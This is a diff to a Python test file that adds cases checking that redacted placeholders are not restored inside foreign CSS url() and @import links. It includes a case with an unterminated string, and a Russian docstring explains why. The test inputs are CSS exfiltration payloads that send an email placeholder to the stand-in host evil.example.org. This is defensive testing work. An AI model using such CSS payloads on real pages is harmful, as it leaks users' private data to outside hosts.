@@ -274,11 +274,15 @@ def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings,
         'b { background: url("https://evil.example.org/?q=\n<EMAIL_1>") }',
         '@import "https://evil.example.org/?q= <EMAIL_1>";',
         "@import url('https://evil.example.org/?q= <EMAIL_1>');",
+        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1></style>',
+        "@import 'https://evil.example.org/?q= <EMAIL_1>",
     ],
 )
 def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
     """FINDINGS P2 «Restore: CSS url("…") with a space inside a style element»: адрес в url(…) и @import
-    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)»."""
+    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)».
+    Строку без закрывающей кавычки CSS кончает концом текста и тоже загружает (найдено при исправлении
+    image-set)."""
     result = restore(link_state(), answer, settings)
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
